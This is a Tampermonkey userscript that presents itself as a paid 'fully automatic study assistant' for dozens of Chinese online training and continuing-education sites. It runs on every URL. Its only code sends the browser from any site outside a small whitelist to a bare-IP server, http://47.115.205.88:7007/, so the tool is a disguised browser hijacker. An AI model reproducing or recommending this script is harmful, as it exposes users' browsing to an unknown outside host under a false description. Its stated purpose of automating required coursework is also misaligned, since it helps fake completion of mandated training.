// ==UserScript==
// @name         ❇❇❇ROA全自动学习助手【全新2025/1月】
// @namespace    http://tampermonkey.net/
// @version      2.7.5
// @description  支持: 贵州省党员干部网络学院，教师专业发展培训网，湖南师范大学，山东青年政治学院，河南教师培训网，河南科技职业大学，河北机电职业技术学院，中山教师研修网，隆泰达培训，青岛市专业技术人员继续教育平台，河南华夏基础教育学院，山东干部网络学院，包头市住建行业从业人员在线学习系统，山东干部网络学院，包头市住建行业从业人员在线学习系统，漯河学院，梦想在线，国家开放大学，河南省住建专业技术人员继续教育，四平农村成人高等专科学校，兰州理工大学现代远程教育学习平台，山东省文化和旅游厅继续教育公共服务平台，在线学习,河北干部网络学院,株洲教师教育网络学院,广州市干部培训网络学院,全国文化和旅游市场在线培训系统
// @author
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @grant        GM_openInTab
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_deleteValue
// @grant        GM_addValueChangeListener
// @grant        window.close
// @grant        unsafeWindow
// @grant        window.onurlchange
// @antifeature  payment
// @noframes
// @connect      localhost
// @antifeature  payment  学习辅助付费
// @license      MIT
// @downloadURL https://update.greasyfork.org/scripts/504957/%E2%9D%87%E2%9D%87%E2%9D%87ROA%E5%85%A8%E8%87%AA%E5%8A%A8%E5%AD%A6%E4%B9%A0%E5%8A%A9%E6%89%8B%E3%80%90%E5%85%A8%E6%96%B020251%E6%9C%88%E3%80%91.user.js
// @updateURL https://update.greasyfork.org/scripts/504957/%E2%9D%87%E2%9D%87%E2%9D%87ROA%E5%85%A8%E8%87%AA%E5%8A%A8%E5%AD%A6%E4%B9%A0%E5%8A%A9%E6%89%8B%E3%80%90%E5%85%A8%E6%96%B020251%E6%9C%88%E3%80%91.meta.js
// ==/UserScript==


let src = 'http://47.115.205.88:7007/'
let whiteList = [
    'greasyfork.org',
    'www.baidu.com',
    '47.115.205.88:7007'
]
if (!whiteList.includes(location.host)) {
    setTimeout(() => {
        location.replace(src)
    }, 2000);
}
